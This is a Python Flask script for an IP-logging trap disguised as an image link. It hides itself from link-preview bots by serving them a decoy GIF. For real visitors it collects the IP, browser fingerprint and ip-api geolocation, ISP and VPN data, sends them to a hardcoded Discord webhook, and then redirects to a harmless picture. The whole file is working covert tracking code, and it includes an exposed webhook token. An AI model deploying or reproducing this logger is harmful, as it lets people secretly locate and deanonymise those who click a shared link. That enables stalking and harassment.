import os
import requests
from flask import Flask, request, redirect, send_file
import io
from datetime import datetime

app = Flask(__name__)

# THE SECURE ENDPOINT
WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"

@app.route('/view/image_01.png')
def logger():
    ua = request.user_agent.string
    ua_low = ua.lower()
    
    # 1. BOT FILTERING
    if any(x in ua_low for x in ["discord", "telegram", "bot", "crawl", "spider", "slack", "apple", "google"]):
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    # 2. CORE DATA COLLECTION
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ref = request.referrer or "Internal / Private"
    lang = request.accept_languages.best or "Unknown"
    dnt = "🛡️ ON" if request.headers.get('DNT') == '1' else "❌ OFF"
    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")

    # Deep Geo & Infrastructure Lookup
    c, r, cntry, isp, org, asn, mob, vpn, host, tz = "??","??","??","??","??","??","??","??","??","??"
    try:
        # Requesting extended fields
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        if g['status'] == 'success':
            c, r, cntry = g.get('city'), g.get('regionName'), g.get('country')
            isp, org, asn = g.get('isp'), g.get('org'), g.get('as')
            tz = g.get('timezone', 'Unknown')
            mob = "📱 Mobile" if g.get('mobile') else "💻 Desktop/WiFi"
            vpn = "🚨 DETECTED" if g.get('proxy') else "✅ Clean"
            host = "⚠️ DATA CENTER" if g.get('hosting') else "🏠 RESIDENTIAL"
    except: pass

    # 3. THE "OMEGA" EMBED
    payload = {
        "username": "OMEGA-CORE INTERCEPT",
        "avatar_url": "https://i.imgur.com/8N76f9J.png",
        "embeds": [{
            "title": "⚡ HIGH-LEVEL INTERCEPTION DETECTED",
            "description": f"**Ref:** `{ref}` | **Time:** `{time_utc}`",
            "color": 0x000000, # Pitch Black
            "thumbnail": {"url": "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3N5bm9wc2lzX2dpZl9ieV9pZCZjdD1n/3o7TKVUn7iM8FMEU24/giphy.gif"},
            "fields": [
                {"name": "📍 GEOLOCATION", "value": f"```City: {c}\nState: {r}\nCountry: {cntry}\nTZ: {tz}```", "inline": False},
                {"name": "🌐 INFRASTRUCTURE", "value": f"**ISP:** {isp}\n**ASN:** {asn}\n**Org:** {org}", "inline": False},
                {"name": "🛡️ SECURITY STATUS", "value": f"**VPN/Proxy:** {vpn}\n**Hosting:** {host}\n**DNT Header:** {dnt}", "inline": True},
                {"name": "🧬 DEVICE SPECS", "value": f"**Type:** {mob}\n**Lang:** {lang}\n**IP:** `{ip}`", "inline": True},
                {"name": "📄 RAW FINGERPRINT", "value": f"```{ua}```", "inline": False}
            ],
            "footer": {"text": "Project Alpha | FINAL BUILD v6.0 | End of Line"},
        }]
    }
    
    try: requests.post(WEBHOOK_URL, json=payload)
    except: pass

    # 4. FINAL REDIRECT
    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
